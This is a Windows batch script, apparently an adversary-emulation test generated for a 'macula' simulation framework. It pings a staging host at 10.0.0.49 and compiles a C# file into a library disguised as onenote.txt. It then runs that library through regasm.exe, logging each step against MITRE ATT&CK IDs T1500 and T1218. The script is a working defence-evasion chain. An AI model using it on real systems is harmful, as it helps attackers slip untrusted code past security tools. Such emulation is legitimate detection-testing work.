@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET qwwnk=1
SET recnn=%APPDATA%\7688\6e83932c
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?7688-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=onenote.txt
SET njozco=file.txt
SET kkjwr=7688

REM Derived paths
SET ymud=%APPDATA%\!ufeybybm!\macula-simulations.log
SET cxhb=%APPDATA%\!ufeybybm!

REM Debug: SCRIPT_START
if "!qwwnk!"=="1" (echo [!DATE! !TIME!][DEBUG][!lqyereup!]: SCRIPT_START=initializing>> "!ymud!" 2>nul)

REM Check server availability
if "!qwwnk!"=="1" (echo [!DATE! !TIME!][DEBUG][!lqyereup!]: HEARTBEAT_START=!uouoq!>> "!ymud!" 2>nul)
curl.exe -k -s -o nul "!uouoq!"
if "!qwwnk!"=="1" (echo [!DATE! !TIME!][DEBUG][!lqyereup!]: HEARTBEAT_RESULT=errorlevel=!ERRORLEVEL!>> "!ymud!" 2>nul)

REM Change directory
if "!qwwnk!"=="1" (echo [!DATE! !TIME!][DEBUG][!lqyereup!]: CHDIR=!recnn!>> "!ymud!" 2>nul)
cd /d "!recnn!" 2>nul
if "!qwwnk!"=="1" (echo [!DATE! !TIME!][DEBUG][!lqyereup!]: CHDIR_RESULT=errorlevel=!ERRORLEVEL!>> "!ymud!" 2>nul)

REM Compile .NET source (T1500)
if "!qwwnk!"=="1" (echo [!DATE! !TIME!][DEBUG][!lqyereup!]: COMPILE_START=csc.exe /target:library !njozco! /out:!hpnjatpj!>> "!ymud!" 2>nul)
csc.exe /target:library "!njozco!" /out:"!hpnjatpj!" >nul 2>&1
SET kpgo=!ERRORLEVEL!
if "!qwwnk!"=="1" (echo [!DATE! !TIME!][DEBUG][!lqyereup!]: COMPILE_RESULT=errorlevel=!kpgo!>> "!ymud!" 2>nul)

REM T1500 logging
SET bzmk=1
SET rtga=
if !kpgo! NEQ 0 (SET bzmk=0 & SET rtga=compile_failed)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!bzmk!:!rtga!>> "!ymud!" 2>nul || ver >nul

REM Execute via regasm (T1218)
if exist "!hpnjatpj!" (
    if "!qwwnk!"=="1" (echo [!DATE! !TIME!][DEBUG][!lqyereup!]: PROCESS_START=regasm.exe /U !hpnjatpj!>> "!ymud!" 2>nul)
    regasm.exe /U "!hpnjatpj!" >nul 2>&1
    SET mskg=!ERRORLEVEL!
    if "!qwwnk!"=="1" (echo [!DATE! !TIME!][DEBUG][!lqyereup!]: PROCESS_RESULT=errorlevel=!mskg!>> "!ymud!" 2>nul)
    
    REM T1218 logging
    SET cyfg=1
    SET jnpp=
    if !mskg! NEQ 0 (SET cyfg=0 & SET jnpp=execution_failed)
    echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!cyfg!:!jnpp!>> "!ymud!" 2>nul || ver >nul
)

REM Debug: SCRIPT_END
if "!qwwnk!"=="1" (echo [!DATE! !TIME!][DEBUG][!lqyereup!]: SCRIPT_END=exit_code=0>> "!ymud!" 2>nul)
ENDLOCAL